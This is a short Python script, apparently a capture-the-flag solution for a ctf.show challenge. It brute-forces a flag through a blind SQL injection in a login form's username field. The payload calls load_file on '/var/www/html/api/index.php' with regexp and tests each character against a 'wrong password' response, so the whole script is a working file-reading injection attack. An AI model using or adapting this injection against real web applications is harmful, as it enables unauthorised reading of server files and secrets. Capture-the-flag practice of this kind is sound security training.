#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/4/15 22:14
# blog: www.wlhhlc.top
import requests
url = "http://f8654e50-ec0f-498d-a38b-c2b5d4fbc7e7.challenge.ctf.show/api/index.php"
all_str = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
flag = "ctfshow{"

for i in range(200):
    for j in all_str:
        data = {
            "username":"if(load_file('/var/www/html/api/index.php')regexp('{0}'),0,1)".format(flag + j),
            'password':0
        }
        res = requests.post(url=url, data=data)
        if r"\u5bc6\u7801\u9519\u8bef" in res.text:
            flag +=j
            print(flag)
            break
        if j=='}':
            exit()
